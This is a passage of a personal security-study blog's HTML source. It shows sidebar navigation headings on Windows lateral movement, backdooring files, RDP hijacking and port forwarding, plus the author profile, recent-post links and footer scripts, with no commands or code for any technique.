WinRM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Remotely-Creating-Services-Using-sc"><span class="nav-text">Remotely Creating Services Using sc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Creating-Scheduled-Tasks-Remotely"><span class="nav-text">Creating Scheduled Tasks Remotely</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Moving-Laterally-Using-WMI"><span class="nav-text">Moving Laterally Using WMI</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E4%B8%8E%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE-Setup"><span class="nav-text">1. 核心概念与连接配置 (Setup)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E4%B8%8E%E5%8D%8F%E8%AE%AE"><span class="nav-text">端口与协议</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E4%BC%9A%E8%AF%9D-Boilerplate-Code"><span class="nav-text">建立会话 (Boilerplate Code)</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E5%88%9B%E5%BB%BA-Process-Creation"><span class="nav-text">2. 远程进程创建 (Process Creation)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1-Service-Creation"><span class="nav-text">3. 远程创建服务 (Service Creation)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E8%BF%9C%E7%A8%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-Scheduled-Tasks"><span class="nav-text">4. 远程计划任务 (Scheduled Tasks)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E8%BF%9C%E7%A8%8B%E5%AE%89%E8%A3%85-MSI-MSI-Installation"><span class="nav-text">5. 远程安装 MSI (MSI Installation)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Use-of-Alternate-Authentication-Material"><span class="nav-text">Use of Alternate Authentication Material</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#NTLM"><span class="nav-text">NTLM</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Kerberos"><span class="nav-text">Kerberos</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Abusing-User-Behaviour"><span class="nav-text">Abusing User Behaviour</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Abusing-Writable-Shares"><span class="nav-text">Abusing Writable Shares</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Backdooring-vbs-Scripts"><span class="nav-text">Backdooring .vbs Scripts</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Backdooring-exe-Files"><span class="nav-text">Backdooring .exe Files</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RDP-hijacking"><span class="nav-text">RDP hijacking</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-Forwarding"><span class="nav-text">Port Forwarding</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-Tunnelling"><span class="nav-text">SSH Tunnelling</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-Local-Port-Forwarding"><span class="nav-text">SSH Local Port Forwarding</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Port-Forwarding-With-socat"><span class="nav-text">Port Forwarding With socat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dynamic-Port-Forwarding-and-SOCKS"><span class="nav-text">Dynamic Port Forwarding and SOCKS</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/3265.html" title="posts&#x2F;3265.html">Windows工具</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/57685.html" title="posts&#x2F;57685.html">tryhackme-AD笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/30538.html" title="posts&#x2F;30538.html">tryhackme-学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36199.html" title="posts&#x2F;36199.html">vulnhub-Brainpan</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/28301.html" title="posts&#x2F;28301.html">HMV-fuzzz复现</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
